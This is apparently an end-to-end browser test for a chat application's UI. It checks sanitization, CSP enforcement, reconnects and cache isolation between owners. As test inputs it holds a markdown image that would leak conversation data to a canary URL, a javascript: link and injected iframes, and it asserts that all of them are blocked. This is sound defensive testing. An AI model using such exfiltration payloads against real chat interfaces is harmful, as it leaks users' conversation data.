// Real Chromium integration; requires built assets, dedicated Postgres and an installed Playwright.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createServer } from 'node:http';
import { spawn } from 'node:child_process';
import { once } from 'node:events';
import { randomBytes, randomUUID } from 'node:crypto';
import { resolve } from 'node:path';
const database=process.env.TEST_DATABASE_URL;
test('retained T3 composer/transcript/sidebar, tool results, reconnect, owner caches and browser export blocking', {skip:!database,timeout:90000}, async()=>{
 const { chromium } = await import(process.env.PLAYWRIGHT_MODULE ?? 'playwright');
 const root=resolve(import.meta.dirname,'../../..'), token=randomBytes(32).toString('hex'), otherToken=randomBytes(32).toString('hex'),owner=`browser-${randomUUID()}`;
 const base='http://127.0.0.1:43224';let child,browser,canaryHits=0;
 const canary=createServer((_q,r)=>{canaryHits++;r.end('canary');});canary.listen(43229,'127.0.0.1');await once(canary,'listening');
 const start=async()=>{child=spawn(process.execPath,['dist/own-main.js'],{cwd:root+'/prototypes/runtime',env:{...process.env,DATABASE_URL:database,OWNER_TOKENS:JSON.stringify({[token]:owner,[otherToken]:owner+'-other'}),OWN_PORT:'43224',OWN_WEB_DIST:root+'/apps/owned-web/dist'},stdio:'pipe'});let errors='';child.stderr.on('data',d=>errors+=String(d));for(let i=0;i<100;i++){if(child.exitCode!==null)throw new Error(errors);try{if((await fetch(base+'/health')).ok)return;}catch{}await new Promise(r=>setTimeout(r,50));}throw new Error('Backend did not start');};
 const stop=async()=>{if(child?.exitCode===null){const done=once(child,'exit');child.kill('SIGTERM');await done;}};
 try{
  await start();browser=await chromium.launch({executablePath:process.env.CHROMIUM_PATH??'/usr/bin/chromium',headless:true,args:['--no-sandbox']});const context=await browser.newContext();const page=await context.newPage();const errors=[];page.on('pageerror',e=>errors.push(String(e)));
  const response=await page.goto(base);assert.match(response.headers()['content-security-policy'],/connect-src 'self'/);assert.equal(response.headers()['referrer-policy'],'no-referrer');
  await page.getByLabel('Owner token').fill(token);await page.getByRole('button',{name:'Connect to T3'}).click();const composer=page.locator('[contenteditable="true"]');await composer.waitFor({state:'visible'});
  await composer.fill('/fixture write browser.txt Hello from native T3');await page.getByRole('button',{name:'Submit message',exact:true}).click();
  await page.getByText('File written in deterministic fixture',{exact:false}).first().waitFor({state:'visible'});
  await page.getByRole('button',{name:/Worked/}).first().click();await page.locator('button[aria-expanded="true"]').filter({hasText:'Worked'}).waitFor();await page.getByText('Write',{exact:true}).first().waitFor({state:'visible'});await page.getByText('Write',{exact:true}).first().click();await page.getByText('path',{exact:true}).first().waitFor({state:'visible'});
  assert.ok(await page.getByRole('button',{name:/New thread/}).count());const threadUrl=page.url();assert.ok(!threadUrl.includes('/draft/'));
  const hostile='![secret-canary](http://127.0.0.1:43229/leak?data=conversation) [intentional](http://127.0.0.1:43229/navigation) [unsafe](javascript:alert(1)) <iframe src="http://127.0.0.1:43229/frame"></iframe>';
  await composer.fill(hostile);await page.getByRole('button',{name:'Submit message',exact:true}).click();await page.getByText('[Image blocked: secret-canary]',{exact:false}).first().waitFor({state:'visible'});
  assert.equal(await page.locator('img[src*="43229"],iframe[src*="43229"],video[src*="43229"]').count(),0);
  assert.equal(await page.locator('a[href^="javascript:"]').count(),0);
  assert.ok(await page.getByRole('link',{name:'intentional',exact:true}).count());assert.equal(canaryHits,0);
  await composer.fill('/fixture bash fixture:production-read');await page.getByRole('button',{name:'Submit message',exact:true}).click();await page.getByText('Sensitive data: exports blocked',{exact:false}).first().waitFor({state:'visible'});
  // Exercise CSP itself too, independently of Markdown sanitization and the fetch adapter.
  await page.evaluate(()=>{const img=document.createElement('img');img.src='http://127.0.0.1:43229/csp-image?data=conversation';document.body.append(img);const iframe=document.createElement('iframe');iframe.src='http://127.0.0.1:43229/csp-frame';document.body.append(iframe);});
  await page.waitForTimeout(100);assert.equal(canaryHits,0);
  await page.reload();await page.getByText('[Image blocked: secret-canary]',{exact:false}).first().waitFor({state:'visible'});
  await stop();await start();await page.reload();await page.getByText('[Image blocked: secret-canary]',{exact:false}).first().waitFor({state:'visible'});assert.equal(canaryHits,0);await page.getByText('Sensitive data: exports blocked',{exact:false}).first().waitFor({state:'visible'});
  // A second tab shares IndexedDB/localStorage, so this checks actual client-cache owner namespacing.
  const second=await context.newPage();await second.goto(base);await second.getByLabel('Owner token').fill(otherToken);await second.getByRole('button',{name:'Connect to T3'}).click();await second.locator('[contenteditable="true"]').waitFor({state:'visible'});
  assert.equal(await second.getByText('Hello from native T3',{exact:false}).count(),0);assert.equal(await second.getByText('secret-canary',{exact:false}).count(),0);
  const id=threadUrl.split('/').at(-1);assert.equal((await fetch(`${base}/api/conversations/${id}`,{headers:{authorization:`Bearer ${otherToken}`}})).status,404);
  assert.deepEqual(errors,[]);console.log('PASS native T3 UI and browser canary: zero silent export requests');
 }finally{await browser?.close();await stop();await new Promise(r=>canary.close(r));}
});
